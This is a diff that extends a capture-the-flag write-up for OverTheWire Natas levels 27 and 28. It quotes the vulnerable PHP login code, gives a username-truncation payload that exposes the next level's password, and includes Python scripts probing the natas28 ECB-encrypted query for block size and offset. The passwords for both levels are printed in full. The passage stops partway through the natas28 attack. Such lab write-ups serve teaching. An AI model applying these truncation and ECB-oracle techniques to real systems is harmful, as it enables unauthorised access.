@@ -1930,3 +1930,253 @@ Access to `http://natas26.natas.labs.overthewire.org/img/test.php` and get passw
 ```
 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ END PASSWORD
 ```
+
+### natas27
+
+```php
+<?
+
+// morla / 10111
+// database gets cleared every 5 min 
+
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+
+function checkCredentials($link,$usr,$pass){
+ 
+    $user=mysql_real_escape_string($usr);
+    $password=mysql_real_escape_string($pass);
+    
+    $query = "SELECT username from users where username='$user' and password='$password' ";
+    $res = mysql_query($query, $link);
+    if(mysql_num_rows($res) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+function validUser($link,$usr){
+    
+    $user=mysql_real_escape_string($usr);
+    
+    $query = "SELECT * from users where username='$user'";
+    $res = mysql_query($query, $link);
+    if($res) {
+        if(mysql_num_rows($res) > 0) {
+            return True;
+        }
+    }
+    return False;
+}
+
+
+function dumpData($link,$usr){
+    
+    $user=mysql_real_escape_string($usr);
+    
+    $query = "SELECT * from users where username='$user'";
+    $res = mysql_query($query, $link);
+    if($res) {
+        if(mysql_num_rows($res) > 0) {
+            while ($row = mysql_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!  
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+
+
+function createUser($link, $usr, $pass){
+
+    $user=mysql_real_escape_string($usr);
+    $password=mysql_real_escape_string($pass);
+    
+    $query = "INSERT INTO users (username,password) values ('$user','$password')";
+    $res = mysql_query($query, $link);
+    if(mysql_affected_rows() > 0){
+        return True;
+    }
+    return False;
+}
+
+
+if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas27', '<censored>');
+    mysql_select_db('natas27', $link);
+   
+
+    if(validUser($link,$_REQUEST["username"])) {
+        //user exists, check creds
+        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
+            echo "Here is your data:<br>";
+            $data=dumpData($link,$_REQUEST["username"]);
+            print htmlentities($data);
+        }
+        else{
+            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
+        }        
+    } 
+    else {
+        //user doesn't exist
+        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){ 
+            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
+        }
+    }
+
+    mysql_close($link);
+} else {
+?> 
+```
+
+First, I tried bypass `mysql_real_escape_string()` function by following http://server1.sharewiz.net/doku.php?id=sql_injection_-_example_attacks:sql_injection_that_gets_around_mysql_real_escape_string, but is doesn't work!
+
+Then, I focused on the comment section of the source code:
+
+```php
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+```
+
+The max username length is 64, and the length of `natas28` is 7. Now we are going to pad to `natas28` with 57 blank space follow by a random string look like that `natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++abcxyz`. 
+
+The username that we created is longer than 64, SQL will automatically truncate the string so that the string is only 64. That is `natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++` equal `natas28`.
+
+Concluding, the payload is `natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++abcxyz`
+
+```
+Welcome natas28 !
+Here is your data:
+Array ( [username] => natas28 [password] => 
+JWwR438wkgTsNKBbcJoowyysdM82YjeF ) 
+```
+
+### natas28
+
+When I search with fixed value `query=a`, the response generate random 3 sentences, look like that:
+
+```
+Whack Computer Joke Database
+
+    Q: How many programmers does it take to change a light bulb?
+    A: None. It's a hardware problem.
+    There are 10 kinds of people in the world: Those that know binary & those that don't
+    Q: What is a computer virus?
+    A: A terminal illness!
+```
+
+But the parameter in URL `?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKriAqPE2%2B%2BuYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D` look like cipher based base64 encode.
+
+If I remove some characters in parameter `query`, I got the following error: `Incorrect amount of PKCS#7 padding for blocksize` -> this is invalid paddding in block cipher, read [ECB](https://github.com/hoangph3/web-security/blob/main/crypto/README.md) first.
+
+First, we need brute-force to find block size.
+
+```python
+#!/usr/bin/python3
+import requests
+import urlparse
+
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+auth_username = "natas28"
+auth_password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
+
+text = 'a'
+
+while len(text) < 50:
+    data = {"query": text}
+    r = requests.post(url, data=data, auth=(auth_username,auth_password))
+    print("len:{}\tcipher:{}".format(len(text), urlparse.unquote(r.url.split('=')[-1])))
+    text += 'a'
+```
+
+```
+len:1   cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=
+len:2   cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=
+...
+len:11  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OetO2gh9PAvqK+3BthQLni68qM9OYQkTq645oGdhkgSlo=
+len:12  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OezoKpVTtluBKA+2078pAPR3X9UET9Bj0m9rt/c0tByJk=
+len:13  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6OeH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY
+len:14  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oe7NNvj9kWTUA1QORJcH0n5UJXo0PararywOOh1xzgPdF7e6ymVfKYoyHpDj96YNTY
+...
+len:27  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7TtoIfTwL6ivtwbYUC54uvKjPTmEJE6uuOaBnYZIEpa
+len:28  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo86CqVU7ZbgSgPttO/KQD0d1/VBE/QY9Jva7f3NLQciZ
+len:29  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqox90cU12/MXUZMaiIebtmORiI6FNnEKRuYd1sD+8c9Tt2K5R19pxsrCD2Rmg17iLmA==
+len:30  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo+zTb4/ZFk1ANUDkSXB9J+VCV6ND2q2q8sDjodcc4D3Re3usplXymKMh6Q4/emDU2A==
+...
+len:43  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qO07aCH08C+or7cG2FAueLryoz05hCROrrjmgZ2GSBKWg==
+len:44  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qPOgqlVO2W4EoD7bTvykA9Hdf1QRP0GPSb2u39zS0HImQ==
+len:45  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qMfdHFNdvzF1GTGoiHm7ZjkYiOhTZxCkbmHdbA/vHPU7diuUdfacbKwg9kZoNe4i5g=
+len:46  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qPs02+P2RZNQDVA5ElwfSflQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng=
+...
+```
+
+Based cipher length, -> block size = 29 - 13 = 45 - 29 = 16 (bytes).
+
+Then, we need brute-force to find byte offset.
+
+```python
+#!/usr/bin/python3
+import requests
+import urlparse
+import base64
+
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+auth_username = "natas28"
+auth_password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
+
+block_size = 16
+text = 'a' * 2 * block_size
+
+pad = 'b'
+
+for l in range(1, block_size):
+    data = {"query": pad * l + text}
+    r = requests.post(url, data=data, auth=(auth_username,auth_password))
+    cipher = urlparse.unquote(r.url.split('=')[-1])
+    cipher = base64.b64decode(cipher).encode("hex")
+    cipher_block = [cipher[i:i+block_size*2] for i in range(0, len(cipher), block_size*2)] #because 1 ascii byte = 2 hex bytes.
+
+    latest = None
+    for block in cipher_block:
+        if block == latest:
+            print('Offset:', l)
+            print('cipher:', cipher_block)
+            break
+        latest = block
+```
+
+```
+('Offset:', 10)
+('cipher:', ['1be82511a7ba5bfd578c0eef466db59c', 'dc84728fdcf89d93751d10a7c75c8cf2', '5c805cbd29fb63e2ec53645325c7a896', 'b39038c28df79b65d26151df58f7eaa3', 'b39038c28df79b65d26151df58f7eaa3', '738a5ffb4a4500246775175ae596bbd6', 'f34df339c69edce11f6650bbced62702'])
+```
+
+Because we have 2 consecutive blocks `b39038c28df79b65d26151df58f7eaa3` in 4th and 5th index:
+
+```
+1be82511a7ba5bfd578c0eef466db59c -> ????????????????
+dc84728fdcf89d93751d10a7c75c8cf2 -> ????????????????
+5c805cbd29fb63e2ec53645325c7a896 -> ??????bbbbbbbbbb (b is padding)
+b39038c28df79b65d26151df58f7eaa3 -> aaaaaaaaaaaaaaaa
+b39038c28df79b65d26151df58f7eaa3 -> aaaaaaaaaaaaaaaa
+738a5ffb4a4500246775175ae596bbd6 -> ????????????????
+f34df339c69edce11f6650bbced62702 -> ????????????????
+```
+
+-> The payload plain text start from 16 - 10 + 1 = 7th byte of 3rd block with len(padding) = 10.
+
+The challenge related to Database, i think we can use SQL injection. However, we need padding first to fill 3rd block.
+
